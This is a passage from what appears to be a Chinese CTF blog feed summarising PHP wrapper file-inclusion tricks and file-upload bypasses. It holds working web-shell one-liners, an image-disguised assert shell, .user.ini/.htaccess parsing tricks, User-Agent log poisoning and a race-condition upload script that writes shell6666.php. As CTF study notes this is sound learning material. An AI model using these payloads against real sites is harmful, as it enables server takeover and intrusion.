class="hljs-built_in">convert</span>.quoted-printable-encode 和 <span class="hljs-built_in">convert</span>.quoted-printable-decode<br></code></pre></td></tr></table></figure><p>3.压缩过滤器</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nsis">主要有两种 <span class="hljs-literal">zlib</span> 和 <span class="hljs-literal">bzip2</span> ,其中 <span class="hljs-literal">zlib</span>.deflate 和 <span class="hljs-literal">bzip2</span>.compress表示对数据进行压缩，<span class="hljs-literal">zlib</span>.inflate 和<br></code></pre></td></tr></table></figure><p>4、加密过滤器 （本特性已自 PHP 7.1.0 起废弃。强烈建议不要使用本特性。）</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">mcrypt.* 和 mdecrypt.*<br></code></pre></td></tr></table></figure><ol><li>data://text/plain 伪协议<br>可以执行任何代码；需要fopen和include全部打开。<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">用法示例1：?page=data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>(); <span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">用法示例2：?page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==</span><br><span class="language-xml">注：经过base64编码后的加号和等号最好手动将其换成url编码形式，以免识别不了。（ =[%3d]; +[%2b] ）</span><br></code></pre></td></tr></table></figure></li></ol><p>2.php://input 伪协议<br>可以将post请求中的数据作为php代码执行；只需要include打开。<br>用法示例：(抓包，在get参数后输入伪协议，在post区域输入php代码。）<br><img src="/img/filter.png" alt="alt text"></p><p>3.php://filter 伪协议<br>读取文件源代码；只需要fopen打开；一般在知晓网站路径的情况下使用。</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">用法示例：?page=php://<span class="hljs-built_in">filter</span>/<span class="hljs-built_in">read</span>=<span class="hljs-built_in">convert</span>.base64-encode/resource=learn.php<br></code></pre></td></tr></table></figure><p>这样，其返回的就是learn.php base64加密后的代码内容。此处learn.php与漏洞文件在同一目录下；否则，还要写相对路径的。</p><p>将参数改为post后，data和php://filter还可使用，php://input失效。</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>协议</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件上传漏洞总结</title>
    <link href="/2022/12/20/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <url>/2022/12/20/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    
    <content type="html"><![CDATA[<h2 id="文件上传漏洞总结"><a href="#文件上传漏洞总结" class="headerlink" title="文件上传漏洞总结"></a>文件上传漏洞总结</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;content-type:text/html;charset=utf-8&quot;</span>);<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br>    <span class="hljs-variable">$temp_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>    <span class="hljs-variable">$size</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;size&#x27;</span>];<br>    <span class="hljs-variable">$error</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;error&#x27;</span>];<br>    <span class="hljs-comment">//pathinfo — 返回文件路径的信息</span><br>    <span class="hljs-variable">$arr</span> = <span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$filename</span>);<br>    <span class="hljs-variable">$ext_suffix</span> = <span class="hljs-variable">$arr</span>[<span class="hljs-string">&#x27;extension&#x27;</span>];<br>    <span class="hljs-comment">//文件&lt;=24</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$size</span> &gt; <span class="hljs-number">24</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error file zise&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">//文件名字长度&lt;=9</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$filename</span>)&gt;<span class="hljs-number">9</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error file name&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">//文件后缀&lt;=3</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$ext_suffix</span>)&gt;<span class="hljs-number">3</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error suffix&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">//后缀过滤掉了大小写的php</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/php/i&quot;</span>,<span class="hljs-variable">$ext_suffix</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error suffix&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">//文件名字也过滤了大小写的php</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/php/i&quot;</span>),<span class="hljs-variable">$filename</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error file name&quot;</span>);<br>    &#125;<br>    <span class="hljs-comment">//满足以上则上传成功</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_name</span>, <span class="hljs-string">&#x27;./&#x27;</span>.<span class="hljs-variable">$filename</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;文件上传成功！&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;文件上传失败！&quot;</span>;<br>    &#125;<br><br> <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>构造一个一句话的文本文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>Nginx的.usr.ini文件上传漏洞<br>对于php中的.usr.ini有如下解释：<br>PHP 会在每个目录下搜寻的文件名；如果设定为空字符串则 PHP 不会搜寻。也就是在.usr.ini中如果设置了文件名，那么任意一个页面都会将该文件中的内容包含进去。<br>我们在.usr.ini中输入auto_prepend_file =a.txt，这样在该目录下的所有文件都会包含a.txt的内容<br>.user.ini中写入 auto_prepend_file=a.txt，然后再写入一个a.txt，里面加入<?php eval($_GET或POST['a']);?>用来执行命令。如果写POST一句话使用蚁剑可以连接上，但是提示没有权限。<br>上传之后就可以利用命令执行了，访问?a=print_r(scandir或glob(‘.’));可以发现一个文件名很长的文件，使用?a=highlight_file(‘xxx’)即可输出flag。</p><p>exif_imagetype()函数<br>函数功能是读取一个图像的第一个字节并检查其签名。 在一句话前面加个GIF89a进行绕过<br>那么现在的一句话如下，可以制作成图片马，但是需要解析成php</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml">GIF89a <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">assert</span>($_REQUEST[<span class="hljs-string">&#x27;cmd&#x27;</span>])</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>而.htaccess是针对apache，htaccess 可以通过设置实现nginx文件解析配置，将.png 后缀的文件解析成 php。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">AddType application/x-httpd-php .jpg <br>//htaccess文件内容<br></code></pre></td></tr></table></figure><p>所以nginx服务器使用的是 .user.ini  </p><p>UA注入访问日志文件<br>首先需要开启服务器记录日志功能</p><p>在不同的系统，存放日志文件地方和文件名不同<br>apache一般是/var/log/apache/access.log</p><p>nginx的log在/var/log/nginx/access.log和/var/log/nginx/error.log<br>先通过/etc/passwd判断是否存在ssrf漏洞<br>因为不管是什么系统，都会在etc目录下存放passwd文件</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?u</span>rl=<span class="hljs-regexp">/etc/passwd</span><br></code></pre></td></tr></table></figure><p>如果成功访问说明是可以访问内网文件, 那么就可以通过这种方式访问日志文件了<br>可以使用include文件包含等方式包含日志文件 再通过UA注入的方式上传一句话木马让日志记录下来，用蚁剑getshell</p><p>条件竞争上传<br>上传成功后和删除文件之间存在一个短的时间差,要执行检查文件和删除文件的操作,可以利用这个时间差完成竞争条件的上传漏洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span>PHP<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-number">1</span>);<br><span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;shell6666.php&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>),<span class="hljs-string">&#x27;&lt;?php @eval($_POST[1])?&gt;&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># coding:utf-8</span><br>import requests<br>def main():<br>    <span class="hljs-attribute">i</span>=0<br>    <span class="hljs-keyword">while</span> 1:<br>        try:<br>            <span class="hljs-built_in">print</span>(i,<span class="hljs-attribute">end</span>=<span class="hljs-string">&#x27;\r&#x27;</span>)<br>            a = requests.<span class="hljs-built_in">get</span>(<span class="hljs-string">&quot;http://aaa.io/XXXXX.php&quot;</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;c4ca4238a0b923820dcc509a6f75849b&quot;</span> <span class="hljs-keyword">in</span> a.text:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;OK&quot;</span>)<br>                break<br>        except Exception as e:<br>            pass<br>        i+=1<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>c4ca4238a0b923820dcc509a6f75849b为md5的1</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
